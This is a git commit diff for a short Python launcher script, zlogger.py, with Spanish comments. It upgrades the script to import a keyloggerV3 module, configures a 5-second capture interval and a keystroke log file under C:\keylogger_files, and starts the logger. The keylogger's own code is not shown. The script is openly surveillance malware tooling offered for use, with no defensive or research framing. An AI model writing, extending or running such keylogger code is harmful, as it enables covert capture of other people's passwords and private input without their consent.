5761ca9f60ec6093b72cfb53d6377b96a31f9323
JavierWell <javier.fgr3@gmail.com>
2024-08-19 14:06:02 -0600

    Update zlogger.py

--- zlogger.py
+++ zlogger.py
@@ -1,3 +1,7 @@
-import keyloggerV2
-my_keylogger = keyloggerV2.Keylogger()
+import keyloggerV3
+
+# Crear una instancia de Keylogger con el intervalo y el archivo de log
+my_keylogger = keyloggerV3.Keylogger(intervalo=5, archivo_log=r"C:\keylogger_files\log_teclas.txt")
+
+# Iniciar el keylogger
 my_keylogger.start()
